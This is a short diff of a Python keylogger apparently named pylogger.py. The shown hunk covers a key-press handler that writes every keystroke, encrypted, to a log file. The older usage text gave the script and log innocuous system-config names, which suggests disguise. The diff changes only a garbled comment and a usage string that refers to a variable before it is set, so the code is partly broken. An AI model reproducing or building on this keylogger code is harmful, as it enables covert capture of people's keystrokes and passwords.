@@ -224,12 +224,12 @@ def OnKeyPress(event):
   fob = open(log_file, 'a')
   key_pressed = event.Key
   if len(key_pressed) == 0:
-	  key_pressed = 'K/X'
+	  key_pressed = 'K/X' # K and X key pressed are not recorded that's this needs to be done explicitly
   fob.write(getEncryptedData(key_pressed))
   fob.write(' ')
 
 if len(sys.argv) != 3:
-	print "-- password & location necessary, syntax: 'python main_sys_config.py password /home/$user_name/sys.conf'"
+	print "-- password & location necessary, use this: 'python pylogger.py password /home/$user_name/" + log_file + "'"
 else:
 	passKey = getPassKey(sys.argv[1])
 	log_file = sys.argv[2]
